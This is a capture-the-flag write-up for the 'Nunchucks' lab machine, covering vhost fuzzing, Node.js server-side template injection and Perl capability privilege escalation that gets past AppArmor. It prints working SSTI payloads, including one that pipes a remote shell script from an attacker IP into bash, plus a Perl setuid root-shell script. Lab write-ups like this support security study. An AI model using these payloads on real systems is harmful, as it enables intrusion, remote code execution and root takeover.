# Nunchucks

**Difficulty:** Easy | **OS:** Linux | **IP:** `10.129.95.252`

## Summary
**Nunchucks** is an easy-difficulty Linux machine that highlights risks associated with hidden vhost subdomains, Server-Side Template Injection (SSTI) in template engines, and privilege escalation via misused binary capabilities constrained by security profiles. Initial access is achieved by fuzzing virtual hosts to find an administrative/service subdomain (`store.nunchucks.htb`), identifying an SSTI vulnerability within the newsletter subscription form, and executing remote code via Node.js template evaluation. Privilege escalation to `root` is accomplished by identifying file capabilities (`cap_setuid+ep`) on the Perl interpreter and bypassing restrictive AppArmor access control rules to spawn an elevated shell.

## Reconnaissance

### Port Scanning (Nmap)
We begin by enumerating active TCP ports and identifying service versions:

- **22**: SSH (OpenSSH 8.2p1 (Ubuntu 4ubuntu0.3))
- **80**: HTTP (nginx 1.18.0)
- **443**: HTTPS (nginx/1.18.0 (SSL/TLS))

### Virtual Host Subdomain Enumeration
Fuzzing for virtual hosts across the target domain reveals an unindexed administrative or service store endpoint:

```
gobuster vhost -u https://nunchucks.htb/ -w subdomains-top1million-20000.txt --append-domain -t 500 -k
```

**Discovered Subdomain:** `store.nunchucks.htb`

Visiting the store site exposes a newsletter subscription feature that accepts user email addresses and reflects them back in confirmation notices.

## Exploitation (Initial Access)

### Server-Side Template Injection (SSTI)
Input fields handling template variables or dynamic strings are tested for expression evaluation flaws.

- **Vulnerability Mechanism:** Submitting a mathematical expression syntax (e.g., `#{7*7}@asdas.com`) results in the server evaluating the expression before rendering (`49@asdas.com`), confirming the presence of a Server-Side Template Injection vulnerability within the backend Node.js template engine.
- **Execution:**
  1) Injecting a template payload that calls system execution objects via constructor traversal allows reading system files like `/etc/passwd`:

     ```
     {{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
     ```

  2) To obtain an interactive session, a reverse shell script or deployment payload is fetched and executed via `curl`:

     ```
     {{range.constructor("return global.process.mainModule.require('child_process').execSync('curl 10.10.14.28/shell.sh | bash')")()}}
     ```

  3) Catching the incoming connection establishes an active shell session under the service user account, allowing retrieval of `user.txt`.

## Privilege Escalation (Root Flag)

### Binary Capability Enumeration
Searching the filesystem for binaries with explicit Linux capabilities reveals an unusual permission configuration on the Perl interpreter:

```
getcap -r / 2>/dev/null
```

**Discovered Capability:** `/usr/bin/perl = cap_setuid+ep`

The `cap_setuid` capability allows the binary to change its effective user ID to root (`uid=0`), even when executed by an unprivileged user.

### AppArmor Profile Bypass
Standard GTFOBins exploitation methods for Perl capabilities fail because an active AppArmor security profile restricts what actions the interpreter can perform (`/etc/apparmor.d/usr.bin.perl` blocks specific system reads and writes to sensitive paths).

- **Vulnerability Mechanism:** AppArmor profiles targeting specific interpreter binaries can sometimes be bypassed by executing scripts through shebang declarations (#!) or alternative file naming wrappers that do not violate the exact command execution rules or invoke restricted runtime contexts.
- **Privilege Escalation Workflow:**
  1) Create a custom script file utilizing the Perl interpreter header to invoke a UID-switching payload:

     ```
     #!/usr/bin/perl
     use POSIX qw(setuid);
     POSIX::setuid(0);
     exec "/bin/sh";
     ```

  2) Save the file (e.g., as `priv.sh`) and grant execution permissions (`chmod +x`).
  3) Executing the script invokes the Perl capability successfully outside the strict command-line argument restrictions, spawning an interactive root shell.

Full administrative root access is acquired, enabling retrieval of `root.txt` from `/root/root.txt`.
